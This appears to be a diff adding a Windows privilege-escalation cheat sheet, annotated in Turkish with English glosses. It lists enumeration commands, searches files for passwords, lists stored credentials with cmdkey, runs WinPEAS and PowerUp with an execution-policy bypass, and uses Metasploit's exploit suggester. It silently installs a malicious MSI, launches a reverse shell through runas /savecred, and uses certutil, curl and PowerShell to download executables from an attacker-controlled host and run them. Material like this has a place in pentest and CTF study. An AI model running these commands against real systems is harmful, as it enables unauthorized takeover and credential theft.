@@ -1,0 +1,62 @@
+whoami /priv
+net users -->net users username
+net localgroup -->net localgroup groupname"(Administrator)"
+systeminfo
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+hostname
+findstr /si password *.txt
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+netstat -ano
+netstat -an | find /i “LISTENING”
+schtasks-->zamanlanmış görevleri gösterir. (show scheduled tasks)
+schtasks /query /fo LIST /v
+driverquery
+sc query windefend -->windows defender hizmeti => (windows defender)
+sc query type=service
+
+WINPEAS-->Windows defender açıksa engeller-->winpeas.exe>outputfile.txt => (blocks if windows defender is on)
+Ayrıcalık hak yükseltme için araç=>WINPEAS=>.bat komut dosyası da çalıştırılabilir. (winpeas is privilege escalation script for windows systems. You can use .bat too)
+
+POWERUP=>Powershell scriptidir. => (POWERUP.sh is a powershell script)
+KULLANIMI= (usage)
+powershell.exe -nop -exec bypass
+Import-Module .\PowerUp.ps1
+Invoke-AllChecks
+
+Windows Exploit Suggester =>Modül=>Girmeden uzaktan tarama. (far scan module)
+metasploit=>multi/recon/local_exploit_suggester
+
+wmic product=>yazılımları gösterir. => (show products)
+wmic product get name,version,vendor 
+wmic service list brief
+wmic service list brief | brief “Running”
+
+sc qc=>Servisler hakkında bilgi => (informations about services)
+Örnek=>sc qc RemoteMouseService => (example)
+sc qc netlogon=>Belirtilmeyen hizmet yolu açıkları bulma=>lsass.exe (Finding unspecified service path vulnerabilities)
+wmic service get name,displayname,pathname,startmode
+sc qc unquotedsvc
+reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+
+--msfvenom ve multi handler sonrası dosya yüklemek-- (upload file after msfvenom and multi handler)
+msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+
+cmdkey /list =>kayıtlı kimlik bilgileri(credentials)
+
+/savecred
+runas
+runas /savecred /user:admin reverse_shell.exe
+
+POWERSHELL DOSYA ÇEKME YÖNTEM (Download file with certutil.exe & curl)
+certutil.exe -urlcache -f http://ip/dosya.exe dosya2.exe=>çekilir. (downloaded)
+
+certutil.exe -urlcache -f "http://$ip:8000/Sharphound.exe => TAZI ÇEKME (download Sharphound.exe)
+python3 -m http.server 8989
+curl  http://$ip:8989/winPEASx64.exe -O winPEASx64.exe
+
+powershell -c wget “http://$ip:port/dosya.exe” -outfile ”file2.exe"
+
+powershell -c wget "http://$ip:8989/winPEASx64.exe" -outfile "winPEASx64.exe"
+.\winPEASx64.exe
+
